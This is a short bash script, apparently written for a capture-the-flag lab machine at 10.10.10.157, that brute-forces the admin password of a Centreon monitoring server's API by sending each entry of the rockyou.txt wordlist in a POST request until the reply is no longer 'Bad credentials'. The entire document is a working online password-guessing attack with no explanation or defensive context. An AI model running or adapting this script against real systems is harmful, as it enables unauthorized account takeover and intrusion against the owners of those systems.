#!/bin/bash



while read line;do

	echo "[+] Trying : $line"
	pwn=$(curl -sX POST http://10.10.10.157/centreon/api/index.php?action=authenticate --data "username=admin&password=$line")
	if [ "$pwn" != "\"Bad credentials\"" ];then
		echo -e "\n[+]PASS -- > $line"
		break
	fi

done < /opt/rockyou.txt
